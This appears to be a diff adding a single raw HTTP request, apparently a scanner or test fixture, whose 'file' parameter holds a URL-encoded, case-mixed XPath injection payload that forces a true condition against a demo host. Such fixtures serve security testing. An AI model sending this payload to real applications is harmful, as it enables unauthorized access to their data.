@@ -1,0 +1,4 @@
+GET /a?file='%20oR%20cOuNt(/*)>0%20Or%20'X'%3D'y HTTP/1.1
+Host: demo.example.com
+Connection: close
+
